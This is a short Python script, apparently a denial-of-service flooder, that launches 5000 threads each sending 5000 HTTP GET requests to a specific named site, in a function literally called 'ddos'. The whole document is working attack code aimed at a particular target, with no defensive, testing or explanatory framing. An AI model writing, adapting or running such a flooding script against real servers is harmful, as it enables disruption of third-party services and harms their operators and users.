import requests
import threading

url = "http://unprospect.eductive.fr"
def ddos():
    for i in range(5000):
        requests.get(url)

for i in range(5000):
    threading.Thread(target=ddos).start()
    print("Thread number " + str(i))